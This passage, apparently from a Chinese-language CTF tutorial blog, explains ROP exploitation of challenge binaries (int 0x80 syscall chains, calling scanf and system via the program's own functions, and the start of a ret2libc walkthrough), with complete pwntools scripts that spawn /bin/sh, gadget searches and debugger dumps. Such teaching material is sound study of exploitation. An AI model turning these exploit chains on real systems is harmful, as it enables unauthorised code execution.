+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn5 --only <span class="string">'pop|ret'</span> | grep <span class="string">'eax'</span> </span><br><span class="line">0x08095ff4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  //&lt;=====</span><br><span class="line">0x080a150a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bc396 : pop eax ; ret</span><br><span class="line">0x080a1509 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+<p>我们可以用这一条<code>0x08095ff4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</code>，</p>
+<p>没有<code>ecx</code>，在找一下<code>pop ecx</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn5 --only <span class="string">'pop|ret'</span> | grep <span class="string">'ecx'</span></span><br><span class="line">0x0804b99a : pop dword ptr [ecx] ; ret</span><br><span class="line">0x080733b1 : pop ecx ; pop ebx ; ret //&lt;=====</span><br><span class="line">0x080e4325 : pop ecx ; ret</span><br><span class="line">0x080733b0 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+<p>用这一个：<code>0x080733b1 : pop ecx ; pop ebx ; ret</code></p>
+<p>寻找溢出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1f </span><br><span class="line">EBX: 0x80481b0 (&lt;_init&gt;:	push   ebx)</span><br><span class="line">ECX: 0x7fffffe1 </span><br><span class="line">EDX: 0x80f14d4 --&gt; 0x0 </span><br><span class="line">ESI: 0x80f000c --&gt; 0x806a620 (&lt;__strcpy_sse2&gt;:	mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EDI: 0x5e (<span class="string">'^'</span>)</span><br><span class="line">EBP: 0x413b4141 (<span class="string">'AA;A'</span>)</span><br><span class="line">ESP: 0xffffd130 (<span class="string">"EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">EIP: 0x41412941 (<span class="string">'A)AA'</span>)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41412941</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd130 (<span class="string">"EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0004| 0xffffd134 (<span class="string">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0008| 0xffffd138 (<span class="string">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0012| 0xffffd13c (<span class="string">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0016| 0xffffd140 (<span class="string">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0020| 0xffffd144 (<span class="string">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0024| 0xffffd148 (<span class="string">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">0028| 0xffffd14c (<span class="string">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41412941 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern_offset A)AA</span><br><span class="line">A)AA found at offset: 32</span><br></pre></td></tr></table></figure>
+<p>随便找了一个<code>sh</code>，地址为<code>0x80BF5C8</code>：</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1ab13b260b.png" alt=""></p>
+<p>到这里就可以愉快的写脚本了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding : utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./pwn5"</span>)</span><br><span class="line"></span><br><span class="line">sh=<span class="number">0x080BF5C8</span>         <span class="comment">#"sh"</span></span><br><span class="line">pop1=<span class="number">0x08095ff4</span>       <span class="comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop2=<span class="number">0x080733b1</span>       <span class="comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">int_80=<span class="number">0x08071005</span>     <span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=<span class="string">"A"</span>*<span class="number">32</span></span><br><span class="line">payload+=p32(pop1)    <span class="comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">payload+=p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(sh)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(sh)</span><br><span class="line">payload+=p32(pop2)    <span class="comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(sh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">"A"</span>)</span><br><span class="line">io.sendline(<span class="string">"A"</span>)</span><br><span class="line">io.sendline(<span class="string">"A"</span>)</span><br><span class="line">io.sendline(<span class="string">"y"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行此脚本时发现并不能成功<code>getshell</code>，猜想是<code>sh</code>字符串的问题，于是尝试换一个方法，向程序输入<code>/bin/sh</code>，找到在<code>bss</code>段的存储位置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">080F</span>1A04                                         ; change_major+<span class="number">33</span>↑o ...</span><br><span class="line">.bss:<span class="number">080F</span>1A20                 <span class="keyword">public</span> first_name</span><br><span class="line">.bss:<span class="number">080F</span>1A20 first_name      db    ? ;               ; DATA XREF: print_beginning+<span class="number">51</span>↑o</span><br><span class="line">.bss:<span class="number">080F</span>1A20                                         ; print_beginning+<span class="number">66</span>↑o ...</span><br><span class="line">.bss:<span class="number">080F</span>1A21                 db    ? ;</span><br><span class="line">.bss:<span class="number">080F</span>1A22                 db    ? ;</span><br></pre></td></tr></table></figure>
+<p>于是将脚本改为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding : utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./pwn5"</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x080f1a20</span>     <span class="comment">#"/bin/sh"</span></span><br><span class="line">pop1 = <span class="number">0x08095ff4</span>       <span class="comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop2 = <span class="number">0x080733b1</span>       <span class="comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">int_80 = <span class="number">0x08071005</span>     <span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">32</span></span><br><span class="line">payload += p32(pop1)    <span class="comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line">payload += p32(pop2)    <span class="comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">io.sendline(<span class="string">"A"</span>)</span><br><span class="line">io.sendline(<span class="string">"A"</span>)</span><br><span class="line">io.sendline(<span class="string">"y"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>getshell</code>成功：</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1b4fd1eaaa.png" alt=""></p>
+<p><strong>小结：</strong></p>
+<blockquote>
+<p>调用系统中断来绕过NX的方法总的来说不算难，要能从程序中找到<code>int 0x80</code>并能找到能改变要调用的函数的参数的指令，然后依次传参利用即可🎳</p>
+</blockquote>
+<h2 id="使用Got表中的函数进行ROP"><a href="#使用Got表中的函数进行ROP" class="headerlink" title="使用Got表中的函数进行ROP"></a>使用Got表中的函数进行ROP</h2><p><a href="https://pan.baidu.com/s/12GkumQmMDv-3yayIDfr2Lw" target="_blank" rel="noopener">题目下载</a></p>
+<p>这是一道来自<code>RedHat 2017</code>的题目<code>pwn1</code></p>
+<p>使用IDA可以很容易发现此程序的<code>main()</code>函数存在栈溢出，伪C代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"pwn test"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序开启了<code>NX</code>，也就是说我们不能直接把shellcode写到栈中执行，因此向我们找一下获取<code>flag</code>的途径，在IDA中可以看到程序调用了<code>system()</code>函数，另外程序中有<code>scanf()</code>，因此我们可以考虑通过<code>scanf()</code>函数将<code>/bin/sh</code>字符串读取到栈中并通过构造ROP链使得程序执行<code>system(&quot;/bin/sh&quot;)</code>从而<code>get flag</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048620 s               db 'pwn test',0         ; DATA XREF: main+9↑o</span><br><span class="line">.rodata:<span class="number">08048629</span> ; <span class="keyword">char</span> format[]</span><br><span class="line">.rodata:08048629 format          db '%s',0               ; DATA XREF: main+2A↑o</span><br><span class="line">.rodata:<span class="number">08048629</span>                                         ; main+<span class="number">3</span>E↑o</span><br><span class="line">.rodata:<span class="number">08048629</span> _rodata         ends</span><br><span class="line">.rodata:<span class="number">08048629</span></span><br></pre></td></tr></table></figure>
+<p><code>scanf()</code>的参数<code>%s</code>的位置为<code>08048629</code></p>
+<p>程序本身并没有可以用来起shell的字符串，因此我们需要通过scanf把/bin/sh写入到内存页中，但是并不是所有的内存页都能写入，我们可以使用IDA的快捷键ctrl+S查看内存页的情况</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd66176beb5e.png" alt=""></p>
+<p>可见在<code>0804A030</code>有一块可读可写且长度足够的空间我们可以把<code>/bin/sh</code>写到这里面</p>
+<p>通过<code>pattern</code>模块可知<code>padding</code>为<code>52</code>，可得脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./pwn1'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">scanf_addr=p32(elf.symbols[<span class="string">'__isoc99_scanf'</span>])</span><br><span class="line">system_addr=p32(elf.symbols[<span class="string">'system'</span>])</span><br><span class="line">baifenhao_s=p32(<span class="number">0x08048629</span>)</span><br><span class="line">binsh_addr=p32(<span class="number">0x0804A030</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">52</span>         <span class="comment">#构造padding</span></span><br><span class="line">payload+=scanf_addr    <span class="comment">#覆盖EIP的值为scanf的函数地址</span></span><br><span class="line">payload+=baifenhao_s   <span class="comment">#scanf的第一个参数：%s</span></span><br><span class="line">payload+=binsh_addr    <span class="comment">#scanf的第二个参数：地址</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>这里出现一些问题如果我们直接像上面那样写脚本的话，在<code>EIP</code>指向<code>scanf()</code>的时候，<code>call __isoc99_scanf</code>之后，<code>ret</code>指令会将call指令压入栈中的地址取出给<code>EIP</code>，但是我们向上面那样构造脚本并没有模拟出<code>call</code>指令的压栈操作，因此我们需要把脚本修改一下，在<code>scanf()</code>的地址和<code>scanf()</code>的参数之间加上一个<code>scanf()</code>调用完成之后的返回地址，由于我们需要调用过<code>scanf()</code>之后再调用<code>system()</code>函数，因此我们可以把这个地址修改为<code>main()</code>函数的地址以便于进行第二次栈溢出执行<code>system()</code>函数，示意图如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----------------+                      +----------------+</span><br><span class="line">|   scanf_addr   |                      |   scanf_addr   | </span><br><span class="line">+----------------+                      +----------------+</span><br><span class="line">|   baifenhao_s  |     ========&gt;        |   main_addr    |</span><br><span class="line">+----------------+      修改为：         +----------------+</span><br><span class="line">|   binsh_addr   |                      |   baifenhao_s  | </span><br><span class="line">+----------------+                      +----------------+</span><br><span class="line">                                        |   binsh_addr   | </span><br><span class="line">                                        +----------------+</span><br></pre></td></tr></table></figure>
+<p><code>main()</code>函数地址为<code>08048531</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048531</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">08048531</span></span><br><span class="line">.text:<span class="number">08048531</span> ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">08048531</span></span><br><span class="line">.text:<span class="number">08048531</span> ; <span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **)</span></span></span><br><span class="line">.text:08048531 main            proc near               ; DATA XREF: start+17↑o</span><br><span class="line">.text:<span class="number">08048531</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">08048531</span>                 push    ebp</span><br><span class="line">.text:<span class="number">08048532</span>                 mov     ebp, esp</span><br></pre></td></tr></table></figure>
+<p>因此脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./pwn1'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">scanf_addr=p32(elf.symbols[<span class="string">'__isoc99_scanf'</span>])</span><br><span class="line">system_addr=p32(elf.symbols[<span class="string">'system'</span>])</span><br><span class="line">main_addr=p32(<span class="number">0x08048531</span>)</span><br><span class="line">baifenhao_s=p32(<span class="number">0x08048629</span>)</span><br><span class="line">binsh_addr=p32(<span class="number">0x0804A030</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">"A"</span>*<span class="number">52</span>         <span class="comment">#构造padding</span></span><br><span class="line">payload1+=scanf_addr    <span class="comment">#覆盖EIP的值为scanf的函数地址</span></span><br><span class="line">payload1+=main_addr     <span class="comment">#ret到main()</span></span><br><span class="line">payload1+=baifenhao_s   <span class="comment">#scanf的第一个参数：%s</span></span><br><span class="line">payload1+=binsh_addr    <span class="comment">#scanf的第二个参数：地址</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">"B"</span>*<span class="number">44</span>         <span class="comment">#构造padding,ebp-8，所以padding-8</span></span><br><span class="line">payload2+=system_addr   <span class="comment">#覆盖EIP的值为system的函数地址</span></span><br><span class="line">payload2+=main_addr     <span class="comment">#system函数的返回地址，无需考虑，可随意填充</span></span><br><span class="line">payload2+=binsh_addr    <span class="comment">#binsh字符串的地址充当system()函数的参数</span></span><br><span class="line">                </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd671a95392d.png" alt=""></p>
+<h2 id="ROP之ret2libc"><a href="#ROP之ret2libc" class="headerlink" title="ROP之ret2libc"></a>ROP之ret2libc</h2><p><a href="https://pan.baidu.com/s/1eKszh72gVUGK3IQeS9uzRg" target="_blank" rel="noopener">题目下载</a></p>
+<p>有时候题目所给的程序中并没有可以直接拿来用的函数地址或者字符串，但是给了<code>libc</code>文件，这个文件中包含我们能用到的函数，因此我们可以通过计算相应的函数地址在<code>libc</code>中的偏移量来计算出<code>libc</code>映射到程序中的起始地址，进而利用<code>libc</code>中的其他函数</p>
+<p>在<code>Security Fest CTF 2016</code>的<code>tvstation</code>中，主要逻辑如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_menu();</span><br><span class="line">      v0 = (<span class="keyword">char</span>)get_one();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">50</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      user();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">51</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Disconnected!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">52</span> )</span><br><span class="line">        debug();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid option!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">49</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      uptime();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里面有一个<code>debug()</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n=== TV Station - Debug Menu ==="</span>);</span><br><span class="line">  v0 = dlsym((<span class="keyword">void</span> *)<span class="number">0xFFFFFFFFFFFFFFFF</span>LL, <span class="string">"system"</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(fmsg, info, v0);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(fmsg);</span><br><span class="line">  write(<span class="number">1</span>, fmsg, v1);</span><br><span class="line">  <span class="keyword">return</span> debug_func(<span class="number">1L</span>L, fmsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此函数会直接泄露<code>system()</code>在此程序中加载的位置</p>
+<p><code>system()</code>在<code>libc</code>的偏移量为<code>00000000000456A0</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000456</span>A0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">00000000000456</span>A0</span><br><span class="line">.text:<span class="number">00000000000456</span>A0</span><br><span class="line">.text:<span class="number">00000000000456</span>A0                 <span class="keyword">public</span> system ; weak</span><br><span class="line">.text:<span class="number">00000000000456</span>A0 system          proc near               ; DATA XREF: LOAD:<span class="number">0000000000007438</span>↑o</span><br><span class="line">.text:<span class="number">00000000000456</span>A0                                         ; LOAD:<span class="number">000000000000B</span>C68↑o</span><br><span class="line">.text:<span class="number">00000000000456</span>A0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000456</span>A0                 test    rdi, rdi</span><br><span class="line">.text:<span class="number">00000000000456</span>A3                 jz      <span class="keyword">short</span> loc_456B0</span><br><span class="line">.text:<span class="number">00000000000456</span>A5                 jmp     sub_45130</span><br></pre></td></tr></table></figure>
+<p><code>/bin/sh</code>的偏移地址<code>000000000018AC40</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000018AC40 aBinSh          db '/bin/sh',0          ; DATA XREF: sub_45130+451↑o</span><br><span class="line">.rodata:<span class="number">000000000018</span>AC40                                         ; _IO_proc_open+<span class="number">2F</span>9↑o ...</span><br></pre></td></tr></table></figure>
+<p>有了<code>system()</code>和<code>/bin/sh</code>的偏移地址后我们需要一个<code>gadget</code>来给<code>system()</code>传参：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary tvstation | grep <span class="string">"pop rdi"</span></span><br><span class="line">0x0000000000400c13 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
